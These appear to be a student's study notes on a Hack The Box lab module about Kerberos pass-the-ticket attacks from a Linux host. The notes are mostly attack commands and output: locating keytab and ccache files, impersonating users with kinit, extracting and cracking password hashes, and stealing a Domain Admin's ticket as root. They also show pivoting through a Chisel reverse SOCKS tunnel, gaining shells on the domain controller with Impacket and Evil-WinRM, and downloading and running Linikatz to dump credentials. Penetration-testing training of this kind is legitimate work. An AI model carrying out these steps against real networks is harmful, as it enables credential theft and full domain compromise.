 a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

#### Check if Linux machine is domain-joined
```shell
realm list
# if realm not available:
 ps -ef | grep -i "winbind\|sssd"
```
![[Pasted image 20250626090110.png]]
### Finding files ending  with .keytab
Using Find to search for files with keytab in the name
```shell-session
find / -type f -name '*.keytab' 2>/dev/null

 find / -name *keytab* -ls 2>/dev/null
```
![[Pasted image 20251007182018.png]]
`fig2 results show keytab for carlos with RW perms on all users`

### Finding keytab files in automated scripts/cronjobs
Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:
```shell
 crontab -l

# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

## importing keytab files
 To use a keytab file, we must have read and write (rw) privileges on the file.
We can now impersonate the user with `kinit`. 
```shell
# grab Principal Name:
 klist -t -k /opt/specialfiles/carlos.keytab | awk '{print $4}'
 
 # import ticket with principal name
kinit $PRINCIPALNAME -k -t <pathtokeytab>

# confirm ticket imported to session
klist
```
![[Pasted image 20251007184220.png]]
We can attempt to access the shared folder 
```
smbclient //dc01/carlos -k -c ls
  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

		7706623 blocks of size 4096. 4459258 blocks available
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c 'get carlos.txt'

```
## Switching to the keytab user
this step is not directly possible, it requires using keytabextract tool to extract secrets (NTLM hashes) from the keytab file
```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```
#### Abusing obtained Hashes
With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

## Finding Kerberos Tickets 
### Finding ccache files

A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. 

Let's look for the environment variables and identify the location of our Kerberos credentials cache:
```shell
# Reviewing environment variables to find  ccache files.
 env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.
```shell
# Searching for ccache files in /tmp
 ls -la /tmp
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
```

---



## Abusing KeyTab files
le. The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

#### Listing KeyTab file information

Pass the Ticket (PtT) from Linux

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

#### Impersonating a user with a KeyTab

Pass the Ticket (PtT) from Linux

```shell-session
 klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.
#### Connecting to SMB Share as Carlos
```shell-session
$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

### KeyTab Extract

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

#### Extracting KeyTab hashes with KeyTabExtract

```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

![Password hash cracker interface showing an NTLM hash cracked to 'Password5' with a green result indicating an exact match.](https://academy.hackthebox.com/storage/modules/308/img/crackstation.jpg)

As we can see in the image, the password for the user Carlos is `Password5`. We can now log in as Carlos.
```shell-session
$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist 
```

### Obtaining more hashes

Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing KeyTab ccache

To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
#### Looking for ccache files

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`.

#### Identifying group membership with the id command

```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

#### Importing the ccache file into our current session

```shell-session


root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
```

```
smbclient //dc01/C$ -k -c ls -no-pass
```

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

## Using Linux attack tools with Kerberos

Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
#### Proxying tool traffic using pivot host
In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

#### Host file modified
```shell-session
cat /etc/hosts
172.16.1.5  ms01.inlanefreight.htb  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.
#### Proxychains configuration file
```shell-session
 cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.
#### Download Chisel to our attack host
```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz

gzip -d chisel_1.7.7_linux_amd64.gz

mv chisel_* chisel && chmod +x ./chisel
```

```
# RUN CHISEL SERVER ATTACKER
sudo ./chisel server --reverse 

```

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

#### Connect to MS01 with xfreerdp
```shell-session
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
#### Execute chisel from MS01

```cmd-session
 c:\tools\chisel.exe client <ATTACKERIP(10.10.14.33)>:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

**Note:** The client IP is your attack host IP.

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
#### Setting the KRB5CCNAME environment variable
```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**Note:** If you are not familiar with file transfer operations, check out the module [File Transfers](https://academy.hackthebox.com/module/details/24).

### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.

#### Using Impacket with proxychains and Kerberos authentication
```shell-session
 proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

### Evil-WinRM

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.
#### Installing Kerberos authentication package

```shell-session
 sudo apt-get install krb5-user -y
```

#### Default Kerberos v5 realm

![Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB.](https://academy.hackthebox.com/storage/modules/308/img/kerberos-realm.jpg)

The Kerberos servers can be empty.
#### Administrative server for your Kerberos realm

![Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm.](https://academy.hackthebox.com/storage/modules/308/img/kerberos-server-dc01.jpg)

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

#### Kerberos configuration file for INLANEFREIGHT.HTB

```shell-session
 cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

...SNIP...

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...SNIP...
```
#### Using Evil-WinRM with Kerberos

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

## Miscellaneous

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

#### Impacket Ticket converter

Pass the Ticket (PtT) from Linux

```shell-session
magdy3660@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.

#### Importing converted ticket into Windows session with Rubeus

Pass the Ticket (PtT) from Linux

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.

Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.

#### Linikatz download and execution

Pass the Ticket (PtT) from Linux

```shell-session
magdy3660@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
magdy3660@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
```